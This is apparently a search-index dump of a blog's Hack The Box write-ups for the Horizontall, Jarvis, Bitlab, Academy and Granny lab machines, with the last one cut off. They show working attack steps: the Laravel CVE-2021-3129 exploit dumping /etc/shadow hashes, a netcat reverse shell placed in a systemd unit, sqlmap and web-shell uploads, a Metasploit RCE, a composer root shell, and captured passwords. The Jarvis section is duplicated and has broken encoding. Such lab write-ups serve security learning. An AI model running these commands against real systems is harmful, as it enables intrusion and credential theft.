AAAAB3NzaC1yc2EAAAADAQABAAABgQDBW7rHQDr3PIFqAeOtCYA01Oreuarq7C1e57RZS9JNyfxCEkfzEzN5NMyTa187fWrfe3gyRAJit4Jii5ECSo1nNPNfJPb4XnxC97k8HGkRpKa8jmF81ua2CPUbcm/DEp51Q5ZK3kTjKmxCwVv3FcAOy+jz9mjl0PIN9e5o05SbbAaCgYT1ep0Z8XxgsDu+yMqyeqs2PgbA0O16Jo1SwMCfT6G4kK+m1eg0lEez/0NS03/Aa+9cezvA2QtBbq3MFIT6WtMjTKfETwqgsVelxIOEyLmpueSrVuuRONTiaKQaIb4kqbEwgRSbP8cDa7U5FH65inP4PQqWLgBeQ5Uk4Y5iejQGbHUiGoz7nGSFK48BBxvFa4+KrQ6xtV087EoS6b2L1+8sRESsNMoesXjo37n6vv8USbJzzX4GSD/TlYO8HIWOf1cb2GT08oglaWlIGZ+7VRlvGMX1FhAZ42s9qRZ3TlSfNmzZjJswm50WZscUdWE/q1HYSs9olpvrpavwC+c=” &gt;&gt; authorized_keys strapi@horizontall:~/.ssh$ chmod 600 authorized_keys\n[root:/git/htb/horizontall]# ssh -L 8000:localhost:8000 strapi@horizontall.htb -i id_rsa-strapi\n[root:/opt/scanners/linux]# netstat -antup Active Internet connections (servers and established) Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name .. tcp 0 0 127.0.0.1:8000 0.0.0.0:* LISTEN 27624/ssh\nIf we now browse http://localhost:8000 we are met with Laravel v8 (PHP v7.4.18) default page.\n\nReading about Laravel on Hacktricks we find that there’s a massive vuln if debuggging mode is enabled. To verify if debugging is enabled, visit: http://127.0.0.1:8000/profiles, which it is.\n\nCVE-2021-3129 allows us to execute commands if debugging is enabled. Google and download a script, phpggc and exploit.\n[root:/git/htb/horizontall]# wget https://raw.githubusercontent.com/simonlee-hello/CVE-2021-3129/main/exploit.py [root:/git/htb/horizontall]# git clone https://github.com/ambionics/phpggc.git [root:/git/htb/horizontall]# mv exploit.py cve-2021-3129.py [root:/git/htb/horizontall]# chmod +x cve-2021-3129.py [root:/git/htb/horizontall]# python3 cve-2021-3129.py http://127.0.0.1:8000 “id” [*] Try to use monolog_rce1 for exploitation. [*] Result: uid=0(root) gid=0(root) groups=0(root)\n[*] Try to use monolog_rce2 for exploitation.\n[*] Result:\nuid=0(root) gid=0(root) groups=0(root)\n\n[*] Try to use monolog_rce3 for exploitation.\n[*] Result:\n[-] RCE echo is not found.\nGrab root.txt, /etc/shaodw and possible ssh private key.\n[root:/git/htb/horizontall]# python3 cve-2021-3129.py http://127.0.0.1:8000 “cat /root/root.txt” (master✱) [*] Try to use monolog_rce1 for exploitation. [*] Result: d07fcc9c8053255d6f7ce4ebed7f7752\n[root:/git/htb/horizontall]# python3 cve-2021-3129.py http://127.0.0.1:8000 “cat /etc/shadow” [*] Try to use monolog_rce1 for exploitation. [*] Result: root:\\(6\\)rGxQBZV9$SbzCXDzp1MEx7xxXYuV5voXCy4k9OdyCDbyJcWuETBujfMrpfVtTXjbx82bTNlPK6Ayg8SqKMYgVlYukVOKJz1:18836:0:99999:7::: developer:\\(6\\)XWN/h2.z$Y6PfR1h7vDa5Hu8iHl4wo5PkWe/HWqdmDdWaCECJjvta71eNYMf9BhHCHiQ48c9FMlP4Srv/Dp6LtcbjrcVW40:18779:0:99999:7::: strapi:\\(6\\)a9mzQsIs$YENaG2S/H/9aqnHRl.6Qg68lCYU9/nDxvpV0xYOn6seH.JSGtU6zqu0OhR6qy8bATowftM4qBJ2ZA5x9EDSUR.:18782:0:99999:7:::\n██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████\n██╗███╗ ██╗███████╗ ██████╗ ██████╗ ███╗ ███╗ █████╗ ████████╗██╗ ██████╗ ███╗ ██╗ ██║████╗ ██║██╔════╝██╔═══██╗██╔══██╗████╗ ████║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗ ██║ ██║██╔██╗ ██║█████╗ ██║ ██║██████╔╝██╔████╔██║███████║ ██║ ██║██║ ██║██╔██╗ ██║ ██║██║╚██╗██║██╔══╝ ██║ ██║██╔══██╗██║╚██╔╝██║██╔══██║ ██║ ██║██║ ██║██║╚██╗██║ ██║██║ ╚████║██║ ╚██████╔╝██║ ██║██║ ╚═╝ ██║██║ ██║ ██║ ██║╚██████╔╝██║ ╚████║ ╚═╝╚═╝ ╚═══╝╚═╝ ╚═════╝ ╚═╝ ╚═╝╚═╝ ╚═╝╚═╝ ╚═╝ ╚═╝ ╚═╝ ╚═════╝ ╚═╝ ╚═══╝\nStrapi 3.0.0-beta.17.4 exploit: CVE-2019-18818 - https://thatsn0tmysite.wordpress.com/2019/11/15/x05/ CVE-2019-19609 - https://nvd.nist.gov/vuln/detail/CVE-2019-19609 - https://bittherapy.net/post/strapi-framework-remote-code-execution/\nSSH Tunneling: https://www.booleanworld.com/guide-ssh-port-forwarding-tunnelling/\nLaravel CVE-2021-3129: https://github.com/simonlee-hello/CVE-2021-3129 https://book.hacktricks.xyz/pentesting/pentesting-web/laravel"
  },
  {
    "objectID": "posts/2019-06-25-htb-writeup-jarvis/2019-06-25-htb-writeup-jarvis.html",
    "href": "posts/2019-06-25-htb-writeup-jarvis/2019-06-25-htb-writeup-jarvis.html",
    "title": "Jarvis - Hack The Box",
    "section": "",
    "text": "USER\n\nBasic enum (nmap -Pn -n -sC -sV -O 10.10.10.143 & dirb http://10.10.10.143)\nKlicka runt p� sidan och se att /room.php?cod=2 kan uts�ttas f�r sql-injection genom att s�tta ’ i slutet av uri\nExecute SQL-injection med sqlmap f�r att f� fram user/pw: sqlmap -u http://10.10.10.143/room.php?cod=2 –current-user –current-db –passwords –tamper=space2comment –random-agent –users –method=GET\nLogga in med crackade creds (DB*****:im******) p� http://10.10.10.143/phpmyadmin/\nMetasploit har en lfi-rce f�r phpmyadmin (multi/http/phpmyadmin_lfi_rce) k�r den f�r meterpreter-shell\nlse.sh visar att simpler.py k�rs som sudo\npspy64 visar att simpler.py k�rs sudo -u pepper /var/www/Admin-Utilities/simpler.py -p\nLadda upp bash reverse shell och k�r scriptet sudo -u pepper /var/www/Admin-Utilities/simpler.py -p Skriv in: “$(bash /tmp/reverse.sh)” utan “” f�r att f� user shell\ncat /home/pepper/user.txt\n\n\n\nROOT\n\nFixa SSH-access med pub-key local host: ssh-keygen remote host: mkdir ~/.ssh/ remote host: vi ~/.ssh/authorized_keys klistra in inneh�ll fr�n pub-key (/root/.ssh/id_rsa.pub) remote host: s�tt permission 700 p� .ssh och 644 p� authorized_keys samt att filen �gs av pepper local host: ssh pepper@10.10.10.143\nlse -l1 visar att /bin/systemctl har suid Exploit info om bins med SUID: https://gtfobins.github.io/gtfobins/\nSkapa en egen service via systemctl som skapar ett reverse root shell (gl�m inte starta nc innan): pepper@jarvis:/bin$ TF=\\((mktemp).service\npepper@jarvis:/bin\\) echo ‘[Service] &gt; Type=oneshot &gt; ExecStart=/bin/sh -c “nc -e /bin/sh 10.10.14.5 4488” &gt; [Install] &gt; WantedBy=multi-user.target’ &gt; \\(TF\npepper@jarvis:/bin\\) ./systemctl link \\(TF\npepper@jarvis:/bin\\) ./systemctl enable –now $TF\ncat /root/root.txt### USER ###\nBasic enum (nmap -Pn -n -sC -sV -O 10.10.10.143 & dirb http://10.10.10.143)\nKlicka runt p� sidan och se att /room.php?cod=2 kan uts�ttas f�r sql-injection genom att s�tta ’ i slutet av uri\nExecute SQL-injection med sqlmap f�r att f� fram user/pw: sqlmap -u http://10.10.10.143/room.php?cod=2 –current-user –current-db –passwords –tamper=space2comment –random-agent –users –method=GET\nLogga in med crackade creds (DB*****:im******) p� http://10.10.10.143/phpmyadmin/\nMetasploit har en lfi-rce f�r phpmyadmin (multi/http/phpmyadmin_lfi_rce) k�r den f�r meterpreter-shell\nlse.sh visar att simpler.py k�rs som sudo\npspy64 visar att simpler.py k�rs sudo -u pepper /var/www/Admin-Utilities/simpler.py -p\nLadda upp bash reverse shell och k�r scriptet sudo -u pepper /var/www/Admin-Utilities/simpler.py -p Skriv in: “$(bash /tmp/reverse.sh)” utan “” f�r att f� user shell\ncat /home/pepper/user.txt\n\n\n\nROOT\n\nFixa SSH-access med pub-key local host: ssh-keygen remote host: mkdir ~/.ssh/ remote host: vi ~/.ssh/authorized_keys klistra in inneh�ll fr�n pub-key (/root/.ssh/id_rsa.pub) remote host: s�tt permission 700 p� .ssh och 644 p� authorized_keys samt att filen �gs av pepper local host: ssh pepper@10.10.10.143\nlse -l1 visar att /bin/systemctl har suid Exploit info om bins med SUID: https://gtfobins.github.io/gtfobins/\nSkapa en egen service via systemctl som skapar ett reverse root shell (gl�m inte starta nc innan): pepper@jarvis:/bin$ TF=\\((mktemp).service\npepper@jarvis:/bin\\) echo ‘[Service] &gt; Type=oneshot &gt; ExecStart=/bin/sh -c “nc -e /bin/sh 10.10.14.5 4488” &gt; [Install] &gt; WantedBy=multi-user.target’ &gt; \\(TF\npepper@jarvis:/bin\\) ./systemctl link \\(TF\npepper@jarvis:/bin\\) ./systemctl enable –now $TF\ncat /root/root.txt"
  },
  {
    "objectID": "posts/2019-11-27-htb-writeup-bitlab/2019-11-27-htb-writeup-bitlab.html",
    "href": "posts/2019-11-27-htb-writeup-bitlab/2019-11-27-htb-writeup-bitlab.html",
    "title": "Bitlab - Hack The Box",
    "section": "",
    "text": "“Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry’s standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum.”\n\n██╗ ██╗███████╗███████╗██████╗ ██║ ██║██╔════╝██╔════╝██╔══██╗ ██║ ██║███████╗█████╗ ██████╔╝ ██║ ██║╚════██║██╔══╝ ██╔══██╗ ╚██████╔╝███████║███████╗██║ ██║ ╚═════╝ ╚══════╝╚══════╝╚═╝ ╚═╝\n\nroot@kali:/opt/htb/machines/bitlab# nmapAutomatorDirb.sh 10.10.10.114 All PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 a2:3b:b0:dd:28:91:bf:e8:f9:30:82:31:23:2f:92:18 (RSA) | 256 e6:3b:fb:b3:7f:9a:35:a8:bd:d0:27:7b:25:d4:ed:dc (ECDSA) |_ 256 c9:54:3d:91:01:78:03:ab:16:14:6b:cc:f0:b7:3a:55 (ED25519) 80/tcp open http nginx | http-robots.txt: 55 disallowed entries (15 shown) | / /autocomplete/users /search /api /admin /profile | /dashboard /projects/new /groups/new /groups/*/edit /users /help |_/s/ /snippets/new /snippets/*/edit | http-title: Sign in GitLab |_Requested resource was http://bitlab.htb/users/sign_in |_http-trane-info: Problem with XML parsing of /evox/about Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\nDIRB\n\nhttp://10.10.10.114:80/deploy.html (CODE:200|SIZE:2571)\nhttp://10.10.10.114:80/explore.html (CODE:200|SIZE:13724)\nhttp://10.10.10.114:80/public.html (CODE:200|SIZE:13810)\nhttp://10.10.10.114:80/search.html (CODE:200|SIZE:13376)\nhttp://10.10.10.114:80/search.php (CODE:200|SIZE:13374)\n\nNIKTO\n\n/.well-known/openid-configuration: OpenID Provider Configuration Information.\nOSVDB-3092: /search.vts: This might be interesting…\nOSVDB-3092: /public/: This might be interesting…\n\nOn the page http://10.10.10.114/help/bookmarks.html we find a bookmark named “Gitlab Login” linking to a weird url. javascript:(function(){ var _0x4b18=[“6C”,“5F6C6F6E”,“6C6D6E”,“6C”,“5F6F”,“”];document_0x4b18[2][_0x4b18[0]]= _0x4b18[3];document_0x4b18[2][_0x4b18[0]]= _0x4b18[5]; })()\nBy looking at it we can see that it’s encoded hex, and something else. Decode it using https://malwaredecoder.com/ javascript:(function(){ document“getElementById”[“value”]= “clave”; document“getElementById”[“value”]= “11des0081x”“;\nOur first set of creds - clave:11des0081x\nThe creds don’t work for SSH, but they do work on the login-page on port 80. Looking around on the page we find a few things .. http://10.10.10.114/root/profile: “TODO: Connect with postgresql” .. http://10.10.10.114/snippets/1: &lt;?php $db_connection = pg_connect(“host=localhost dbname=profiles user=profiles password=profiles”); \\(result = pg_query(\\)db_connection, “SELECT * FROM profiles”);\npsql is not reachable from our remote machine, maybe this is our way towards user / root from init.\nWe are able to upload files in http://10.10.10.114/root/profile/tree/master, upload a shell (webshell or reverse php) Using dirb we can locate the url for our shell. We know that index.php, README.md and developer.jpg are in the same folder.\nDIRB\n\nhttp://bitlab.htb/profile/index.php (CODE:200|SIZE:4184)\n\nWe can now reach our shell(s) by either .. http://bitlab.htb/profile/webshell.php http://bitlab.htb/profile/rev.php\nroot@kali:/opt/htb/machines/bitlab# nc -lvnp 4488 listening on [any] 4488 … connect to [10.10.14.10] from (UNKNOWN) [10.10.10.114] 56174 Linux bitlab 4.15.0-29-generic #31-Ubuntu SMP Tue Jul 17 15:39:52 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux 20:57:55 up 5 min, 0 users, load average: 3.04, 1.75, 0.79 USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT uid=33(www-data) gid=33(www-data) groups=33(www-data) /bin/sh: 0: can’t access tty; job control turned off $\nUpgrade the shell for ease of management. www-data@bitlab:/$\nUploading lse.sh and running it shows that postgresql is up and running on it’s default port - 5432. ================================================================( network )===== [*] net000 Services listening only on localhost………………………. yes! — tcp LISTEN 0 128 127.0.0.1:3022 0.0.0.0: tcp LISTEN 0 128 127.0.0.1:5432 0.0.0.0:\nAnd OpenSSH 7.2p2 on port 3022. www-data@bitlab:/dev/shm$ curl 127.0.0.1:3022 SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.6\nBy default, postgresql is running in Kali Linux. Stop the service, setup a SSH-tunnel and connect using rsql root@kali:/opt/htb/machines/bitlab# service postgresql stop\nwww-data@bitlab:/srv/apps/profile/.git$ ssh -R 5432:127.0.0.1:5432 p3@10.10.14.10\nroot@kali:/opt/htb/machines/bitlab# psql -h 127.0.0.1 -U profiles -d profiles Password for user profiles: (profiles) psql (12.1 (Debian 12.1-1), server 10.4 (Ubuntu 10.4-2.pgdg18.04+1)) Type “help” for help. profiles=&gt; profiles=&gt; TABLE profiles; id | username | password —-+———-+———————— 1 | clave | c3NoLXN0cjBuZy1wQHNz== (1 row)\nDecoding the password gives us “ssh-str0ng-p@ss” however we can’t login with that password. Trying the encrypted password works tho.\nGrab user.txt root@p3:/opt/htb/machines/bitlab# ssh clave@bitlab.htb clave@bitlab.htb’s password: (c3NoLXN0cjBuZy1wQHNz==) Last login: Thu Nov 28 10:42:18 2019 from 10.10.14.10 clave@bitlab:~$ cat user.txt 1e3f****************************\n\n██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████\n██████╗ ██████╗ ██████╗ ████████╗ ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝ ██████╔╝██║ ██║██║ ██║ ██║ ██╔══██╗██║ ██║██║ ██║ ██║ ██║ ██║╚██████╔╝╚██████╔╝ ██║ ╚═╝ ╚═╝ ╚═════╝ ╚═════╝ ╚═╝\n\nEnumerating the box as user Clave we find RemoteConnection.exe in the home folder. Reading the forums they suggest to study the challenge reverse EasyPass. Move the .exe to your Windows box, install Immunity Debugger and open the file.\n“Search for” &gt; “All referenced test strings” And I found the reference “clave”. I set a breakpoint on the “MOV” function above the reference clave and run the program again. I get following output in my Registers Window:\nEAX 02C63AE0 UNICODE “-ssh root@gitlab.htb -pw”Qf7]8YSV.wDNF[7d?j&eD4^“” ECX 00000000 EDX 00000033 EBX 02C63A00 ASCII “-ssh root@gitlab.htb -pw”Qf7]8YSV.wDNF[7d?j&eD4^“” ESP 00CFFA40 EBP 00CFFAC0 ESI 02C63A33 EDI 00CF0022 EIP 00DC163C RemoteCo.00DC163C C 0 ES 002B 32bit 0(FFFFFFFF) P 1 CS 0023 32bit 0(FFFFFFFF) A 0 SS 002B 32bit 0(FFFFFFFF) Z 1 DS 002B 32bit 0(FFFFFFFF) S 0 FS 0053 32bit A62000(FFF) T 0 GS 002B 32bit 0(FFFFFFFF) D 0 O 0 LastErr ERROR_INSUFFICIENT_BUFFER (0000007A) EFL 00000246 (NO,NB,E,BE,NS,PE,GE,LE) ST0 empty g ST1 empty g ST2 empty g ST3 empty g ST4 empty g ST5 empty g ST6 empty g ST7 empty g 3 2 1 0 E S P U O Z D I FST 0000 Cond 0 0 0 0 Err 0 0 0 0 0 0 0 0 (GT) FCW 027F Prec NEAR,53 Mask 1 1 1 1 1 1\nGo back to the Linux-box and ssh to get root.txt root@p3:~# ssh root@bitlab.htb root@bitlab.htb’s password: (Qf7]8YSV.wDNF[7d?j&eD4^) Last login: Fri Sep 13 14:11:14 2019 root@bitlab:~# cat root.txt 8d4c***************************\n\n██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████\n██╗███╗ ██╗███████╗ ██████╗ ██████╗ ███╗ ███╗ █████╗ ████████╗██╗ ██████╗ ███╗ ██╗ ██║████╗ ██║██╔════╝██╔═══██╗██╔══██╗████╗ ████║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗ ██║ ██║██╔██╗ ██║█████╗ ██║ ██║██████╔╝██╔████╔██║███████║ ██║ ██║██║ ██║██╔██╗ ██║ ██║██║╚██╗██║██╔══╝ ██║ ██║██╔══██╗██║╚██╔╝██║██╔══██║ ██║ ██║██║ ██║██║╚██╗██║ ██║██║ ╚████║██║ ╚██████╔╝██║ ██║██║ ╚═╝ ██║██║ ██║ ██║ ██║╚██████╔╝██║ ╚████║ ╚═╝╚═╝ ╚═══╝╚═╝ ╚═════╝ ╚═╝ ╚═╝╚═╝ ╚═╝╚═╝ ╚═╝ ╚═╝ ╚═╝ ╚═════╝ ╚═╝ ╚═══╝\nPostgreSQL: https://gist.github.com/Kartones/dd3ff5ec5ea238d4c546 https://www.postgresql.org/docs/8.3/app-psql.html\nEasyPass: https://www.youtube.com/watch?v=zDjut5L_NnY"
  },
  {
    "objectID": "posts/2020-12-07-htb-writeup-academy/2020-12-07-htb-writeup-academy.html",
    "href": "posts/2020-12-07-htb-writeup-academy/2020-12-07-htb-writeup-academy.html",
    "title": "Academy - Hack The Box",
    "section": "",
    "text": "“Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry’s standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum.”\n\n██╗ ██╗███████╗███████╗██████╗ ██║ ██║██╔════╝██╔════╝██╔══██╗ ██║ ██║███████╗█████╗ ██████╔╝ ██║ ██║╚════██║██╔══╝ ██╔══██╗ ╚██████╔╝███████║███████╗██║ ██║ ╚═════╝ ╚══════╝╚══════╝╚═╝ ╚═╝\n\n[root:/git/htb/Academy]# nmap -Pn -sCV -n 10.10.10.215 (master✱) Host discovery disabled (-Pn). All addresses will be marked ‘up’ and scan times will be slower. Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-07 11:32 CET Nmap scan report for 10.10.10.215 Host is up (0.043s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 c0:90:a3:d8:35:25:6f:fa:33:06:cf:80:13:a0:a5:53 (RSA) | 256 2a:d5:4b:d0:46:f0:ed:c9:3c:8d:f6:5d:ab:ae:77:96 (ECDSA) |_ 256 e1:64:14:c3:cc:51:b2:3b:a6:28:a7:b1:ae:5f:45:35 (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Did not follow redirect to http://academy.htb/ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\n\n\nDIRB:\n\n\n\n\nNIKTO:\n\n\n\nVisiting http://10.10.10.215 forwards you to http://academy.htb, add it to /etc/hosts. Create an account (test:test) and login. Looks like an education platform promotion, similar to their shop release when they created the box SwagShop. Looking on the page there’s not much we can do. We are logged in as user egre55 and none of the links seem to go anywhere. Add the username to a file and start to fuzz.\nroot@nidus:/git/htb/Academy# ffuf -c -w /usr/share/wordlists/dirb/big.txt -u http://academy.htb/FUZZ.php -b “PHPSESSID=qotlc86o7lnh9jm51atioq3fbc” ________________________________________________\n:: Method : GET :: URL : http://academy.htb/FUZZ.php :: Wordlist : FUZZ: /usr/share/wordlists/dirb/big.txt :: Header : Cookie: PHPSESSID=qotlc86o7lnh9jm51atioq3fbc :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403 ________________________________________________\n.htpasswd [Status: 403, Size: 276, Words: 20, Lines: 10] .htaccess [Status: 403, Size: 276, Words: 20, Lines: 10] admin [Status: 200, Size: 2633, Words: 668, Lines: 142] config [Status: 200, Size: 0, Words: 1, Lines: 1] index [Status: 200, Size: 2117, Words: 890, Lines: 77] login [Status: 200, Size: 2627, Words: 667, Lines: 142] register [Status: 200, Size: 3003, Words: 801, Lines: 149]\nAfter spending some time enumerating the website, I started to investigate register.php, and in the code you can set your roleid. \nChange the roleid value from 0 (what I assume is user) to 1 (what I assume is admin), and create a new user.\nTry to login with your new admin account (test2:test2) on http://academy.htb/admin.php - SUCCESS!\nLogged in as admin we find a to-do list:\nItem Status Complete initial set of modules (cry0l1t3 / mrb3n) done Finalize website design done Test all modules done Prepare launch campaign done Separate student and admin roles done Fix issue with dev-staging-01.academy.htb pending\nAdd dev-staging-01.academy.htb to /etc/hosts and visit the URL.\nAPP_NAME “Laravel” — snip — APP_KEY “base64:dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=” — snip — DB_DATABASE “homestead” DB_USERNAME “homestead” DB_PASSWORD “secret”\nGoogling for Laravel vuln one of the first links that pops up is: “PHP Laravel Framework 5.5.40 / 5.6.x &lt; 5.6.30 - token Unserialize Remote Command Execution (Metasploit)”\nmsf6 &gt; use exploit/unix/http/laravel_token_unserialize_exec msf6 exploit(unix/http/laravel_token_unserialize_exec) &gt; set rhosts academy.htb msf6 exploit(unix/http/laravel_token_unserialize_exec) &gt; set vhost dev-staging-01.academy.htb msf6 exploit(unix/http/laravel_token_unserialize_exec) &gt; set app_key dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0= msf6 exploit(unix/http/laravel_token_unserialize_exec) &gt; set lhost 10.10.14.3 msf6 exploit(unix/http/laravel_token_unserialize_exec) &gt; run\n[*] Started reverse TCP handler on 10.10.14.3:4444 [*] Command shell session 1 opened (10.10.14.3:4444 -&gt; 10.10.10.215:51084) at 2020-12-07 12:47:57 +0100 [*] Command shell session 2 opened (10.10.14.3:4444 -&gt; 10.10.10.215:51086) at 2020-12-07 12:47:58 +0100\nwhoami www-data\npython3 -c ‘import pty;pty.spawn(“/bin/bash”)’ www-data@academy:/var/www/html/htb-academy-dev-01/public$\nwww-data@academy:/home$ ls -al ls -al total 32 drwxr-xr-x 8 root root 4096 Aug 10 00:34 . drwxr-xr-x 20 root root 4096 Aug 7 12:07 .. drwxr-xr-x 2 21y4d 21y4d 4096 Aug 10 00:34 21y4d drwxr-xr-x 2 ch4p ch4p 4096 Aug 10 00:34 ch4p drwxr-xr-x 4 cry0l1t3 cry0l1t3 4096 Aug 12 21:58 cry0l1t3 drwxr-xr-x 3 egre55 egre55 4096 Aug 10 23:41 egre55 drwxr-xr-x 2 g0blin g0blin 4096 Aug 10 00:34 g0blin drwxr-xr-x 5 mrb3n mrb3n 4096 Aug 12 22:19 mrb3n\nEnumerating the machine we find credentials in /var/www/html/academy/.env\nDB_DATABASE=academy DB_USERNAME=dev DB_PASSWORD=mySup3rP4s5w0rd!!\n\nTry the password with previous found usernames.\nsu cry0l1t3\nPassword: mySup3rP4s5w0rd!!\n\n$ whoami\nwhoami\ncry0l1t3\n\n\npython3 -c 'import pty;pty.spawn(\"/bin/bash\")'\ncry0l1t3@academy:/var/www/html/academy/public$\ncry0l1t3@academy:/var/www/html/academy/public$ cd ~\ncry0l1t3@academy:~$ cat user.txt\n  b6254e041fcd518b6e09ed6ebb07b3d8\n██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████\n██████╗ ██████╗ ██████╗ ████████╗ ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝ ██████╔╝██║ ██║██║ ██║ ██║ ██╔══██╗██║ ██║██║ ██║ ██║ ██║ ██║╚██████╔╝╚██████╔╝ ██║ ╚═╝ ╚═╝ ╚═════╝ ╚═════╝ ╚═╝\n\nUpload and run linPEAS.sh\n\n[+] All users & groups uid=0(root) gid=0(root) groups=0(root) uid=1000(egre55) gid=1000(egre55) groups=1000(egre55),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lxd) uid=1001(mrb3n) gid=1001(mrb3n) groups=1001(mrb3n) uid=1002(cry0l1t3) gid=1002(cry0l1t3) groups=1002(cry0l1t3),4(adm) uid=1003(21y4d) gid=1003(21y4d) groups=1003(21y4d) uid=1004(ch4p) gid=1004(ch4p) groups=1004(ch4p) uid=1005(g0blin) gid=1005(g0blin) groups=1005(g0blin)\nLooking at the user and group configuration cry0l1t3 is assigned to adm, together with egre55. Reading about adm I find the following: “adm: Group adm is used for system monitoring tasks. Members of this group can read many log files in /var/log, and can use xconsole. Historically, /var/log was /usr/adm (and later /var/adm), thus the name of the group.”\nLucky for us, passwords from users as they use sudo / su on the CLI are stored in clear text, in the audit logs.\nBrowse all audit logs and grab from TTY to find cli commands. Here we find one line containing the su command.\ncry0l1t3@academy:/var/log/audit$ cat * | grep TTY type=TTY msg=audit(1597199293.906:84): tty pid=2520 uid=1002 auid=0 ses=1 major=4 minor=1 comm=“su” data=6D7262336E5F41634064336D79210A\nDecode the hex-data using xxd [root:/git/htb/Academy]# echo 6D7262336E5F41634064336D79210A | xxd -r -p (master✱) mrb3n_Ac@d3my!\ncry0l1t3@academy:/var/log/audit$ su mrb3n Password: mrb3n_Ac@d3my! $ whoami mrb3n\n\nCheck is mrb3n can execute any sudo commandos.\n\n$ sudo -l [sudo] password for mrb3n: Matching Defaults entries for mrb3n on academy: env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin\nUser mrb3n may run the following commands on academy: (ALL) /usr/bin/composer\nLook on gtfobins for composer, and there’s a privesc to root. Copy + paste and grab flag.\n$ TF=$(mktemp -d) $ echo ‘{“scripts”:{“x”:“/bin/sh -i 0&lt;&3 1&gt;&3 2&gt;&3”}}’ &gt;$TF/composer.json $ sudo composer –working-dir=$TF run-script x\n# whoami root # pwd /tmp/tmp.8MLPtosGp5 # cat /root/root.txt 8e76c5ed8f2684789aa970804402a032\n██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████\n██╗███╗ ██╗███████╗ ██████╗ ██████╗ ███╗ ███╗ █████╗ ████████╗██╗ ██████╗ ███╗ ██╗ ██║████╗ ██║██╔════╝██╔═══██╗██╔══██╗████╗ ████║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗ ██║ ██║██╔██╗ ██║█████╗ ██║ ██║██████╔╝██╔████╔██║███████║ ██║ ██║██║ ██║██╔██╗ ██║ ██║██║╚██╗██║██╔══╝ ██║ ██║██╔══██╗██║╚██╔╝██║██╔══██║ ██║ ██║██║ ██║██║╚██╗██║ ██║██║ ╚████║██║ ╚██████╔╝██║ ██║██║ ╚═╝ ██║██║ ██║ ██║ ██║╚██████╔╝██║ ╚████║ ╚═╝╚═╝ ╚═══╝╚═╝ ╚═════╝ ╚═╝ ╚═╝╚═╝ ╚═╝╚═╝ ╚═╝ ╚═╝ ╚═╝ ╚═════╝ ╚═╝ ╚═══╝\nLaravel RCE https://www.exploit-db.com/exploits/47129\nSystem Groups - adm https://wiki.debian.org/SystemGroups\nLogging Passwords - audit https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/"
  },
  {
    "objectID": "posts/2021-02-25-htb-writeup-granny/2021-02-25-htb-writeup-granny.html",
    "href": "posts/2021-02-25-htb-writeup-granny/2021-02-25-htb-writeup-granny.html",
    "title": "Granny - Hack The Box",
    "section": "",
    "text": "██╗   ██╗███████╗███████╗██████╗\n   ██║   ██║██╔════╝██╔════╝██╔══██╗\n   ██║   ██║███████╗█████╗  ██████╔╝\n   ██║   ██║╚════██║██╔══╝  ██╔══██╗\n   ╚██████╔╝███████║███████╗██║  ██║\n    ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝\n\n\n1. [root:/git/htb/granny]# nmap -Pn -n -sCV 10.10.10.15 --open                                                                        (master)\n    PORT   STATE SERVICE VERSION\n    80/tcp open  http    Microsoft IIS httpd 6.0\n    | http-methods:\n    |_  Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT\n    |_http-server-header: Microsoft-IIS/6.0\n    |_http-title: Under Construction\n    | http-webdav-scan:\n    |   Server Type: Microsoft-IIS/6.0\n    |   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH\n    |   WebDAV type: Unknown\n    |   Server Date: Tue, 02 Mar 2021 14:46:58 GMT\n    |_  Allowed Methods: OPTIONS, TRACE, 